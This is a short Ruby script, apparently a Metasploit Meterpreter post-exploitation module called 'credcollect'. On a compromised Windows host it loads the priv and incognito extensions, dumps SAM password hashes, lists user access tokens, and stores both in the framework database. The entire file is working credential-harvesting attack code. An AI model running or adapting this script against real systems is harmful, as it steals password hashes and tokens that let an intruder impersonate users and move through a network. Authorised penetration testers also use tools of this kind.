# credcollect - tebo[at]attackresearch.com

# Make sure we're rockin Priv and Incognito
if not extensions.include?("priv"); client.core.use("priv") end
if not extensions.include?("incognito"); client.core.use("incognito") end

# It wasn't me mom! Stinko did it!
hashes = client.priv.sam_hashes

# Target infos for the db record
addr = client.sock.peerhost
host = client.framework.db.report_host_state(self, addr, Msf::HostState::Alive)

# Record hashes to the running db instance as auth_HASH type
hashes.each do |user|

	type = "auth_HASH"
	data = user.to_s

	# We'll make this look like an auth note anyway
	client.framework.db.get_note(self, host, type, data)
end

# Record user tokens
tokens = client.incognito.incognito_list_tokens(0).values
# Meh, tokens come to us as a formatted string
tokens = tokens.to_s.strip!.split("\n")

tokens.each do |token|
	type = "auth_TOKEN"
	data = token

	client.framework.db.get_note(self, host, type, data)
end
